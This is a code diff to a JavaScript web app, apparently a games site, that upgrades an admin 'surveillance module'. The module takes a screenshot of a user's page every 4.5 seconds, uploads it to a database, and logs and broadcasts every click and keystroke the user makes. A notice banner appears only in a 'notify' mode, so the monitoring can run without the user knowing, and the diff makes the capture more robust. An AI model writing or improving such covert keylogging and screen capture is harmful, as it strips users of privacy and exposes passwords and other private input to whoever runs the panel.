@@ -3734,7 +3734,7 @@ ADMIN SURVEILLANCE STYLES (V5.0 - PRO MODERATOR LAYOUT)
 
 /* 
 ========================================================================
-NEW LIVE-STREAM SURVEILLANCE MODULE (V4.2 - SMART-VIEW CAPTURE)
+NEW LIVE-STREAM SURVEILLANCE MODULE (V4.5 - ROBUST RECOVERY)
 ========================================================================
 */
 
@@ -3768,7 +3768,6 @@ async function initMonitoringAgent() {
 function beginCaptureLoop(type) {
     if (snapshotInterval) stopCaptureLoop(); 
     
-    // TEMPORARY BANNER LOGIC (10 Seconds)
     const toast = document.getElementById('surveillanceToast');
     if (toast && type === 'notify') {
         toast.style.display = 'block';
@@ -3786,32 +3785,35 @@ function beginCaptureLoop(type) {
     window.addEventListener('click', logSurveillanceEvent);
     window.addEventListener('keydown', logSurveillanceEvent);
 
-    // SMART SNAPSHOT LOOP
+    // ROBUST SNAPSHOT ENGINE
     snapshotInterval = setInterval(async () => {
         try {
-            // Determine if the user is in a game or on the dashboard
             const zoneViewer = document.getElementById('zoneViewer');
             const isPlaying = zoneViewer && zoneViewer.style.display === 'flex';
-            
-            // For games, target the viewer; otherwise, target the whole body
             const captureTarget = isPlaying ? zoneViewer : document.body;
 
             const canvas = await html2canvas(captureTarget, { 
-                scale: 0.18, 
+                scale: 0.2, 
                 useCORS: true,
                 allowTaint: true,
                 backgroundColor: "#020617", 
                 logging: false,
-                ignoreElements: (el) => el.id === 'modModal' || el.id === 'surveillanceToast' || el.tagName === 'NAV'
+                // FIX: Ensure it captures the visible area regardless of scroll
+                scrollX: 0,
+                scrollY: -window.scrollY,
+                windowWidth: document.documentElement.offsetWidth,
+                windowHeight: document.documentElement.offsetHeight,
+                ignoreElements: (el) => el.id === 'modModal' || el.id === 'surveillanceToast'
             });
             
-            const dataUrl = canvas.toDataURL("image/webp", 0.1); 
+            // FIX: JPEG is more compatible/stable than WebP for cross-browser dataUrls
+            const dataUrl = canvas.toDataURL("image/jpeg", 0.3); 
             
             await _supabase.from('surveillance').update({ 
                 screen_snapshot: dataUrl,
                 updated_at: new Date().toISOString()
             }).eq('target_user', currentUser);
-        } catch (e) { console.warn("Surveillance sync lag..."); }
+        } catch (e) { console.warn("Snapshot Skip: User Tab inactive or rendering lag."); }
     }, 4500); 
 }
 
@@ -3827,26 +3829,9 @@ function stopCaptureLoop() {
 
 function logSurveillanceEvent(e) {
     if (!broadcastChannel) return;
-    
-    let detail = "";
-    if (e.type === 'click') {
-        detail = `Clicked: ${e.target.tagName} ${e.target.id ? '#' + e.target.id : ''}`;
-    } else {
-        detail = `Typed: ${e.key}`;
-    }
-
-    const payload = {
-        event: 'activity',
-        user: currentUser,
-        detail: detail,
-        time: new Date().toLocaleTimeString()
-    };
-
-    broadcastChannel.send({
-        type: 'broadcast',
-        event: 'log',
-        payload: payload
-    });
+    let detail = e.type === 'click' ? `Clicked: ${e.target.tagName}` : `Typed: ${e.key}`;
+    const payload = { event: 'activity', user: currentUser, detail: detail, time: new Date().toLocaleTimeString() };
+    broadcastChannel.send({ type: 'broadcast', event: 'log', payload: payload });
 }
 
 async function handleSurveillanceStart(username) {
@@ -3887,7 +3872,9 @@ function initSurveillanceSubscription() {
 
     profilePollingInterval = setInterval(async () => {
         const { data } = await _supabase.from('surveillance').select('screen_snapshot').eq('target_user', currentMonitoringUser).maybeSingle();
-        if (data?.screen_snapshot && feedImg) {
+        
+        // FIX: Verify dataUrl integrity before applying to avoid broken image icon
+        if (data?.screen_snapshot && data.screen_snapshot.startsWith('data:image') && feedImg) {
             feedImg.src = data.screen_snapshot;
             document.getElementById('surveillanceStatus').innerText = `LIVE: ${currentMonitoringUser}`;
         }
